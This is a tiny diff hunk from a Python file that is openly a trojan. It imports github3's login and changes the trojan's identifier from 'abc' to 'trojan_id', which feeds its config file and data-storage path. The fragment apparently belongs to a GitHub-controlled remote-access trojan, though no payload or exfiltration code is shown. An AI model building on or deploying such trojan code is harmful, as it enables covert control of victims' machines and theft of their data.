@@ -10,7 +10,7 @@ import imp
 
 from github3 import login
 
-trojan_id = "abc"
+trojan_id = "trojan_id"
 
 trojan_config   = "%s.json" %trojan_id
 data_path       = "data/%s/" %trojan_id
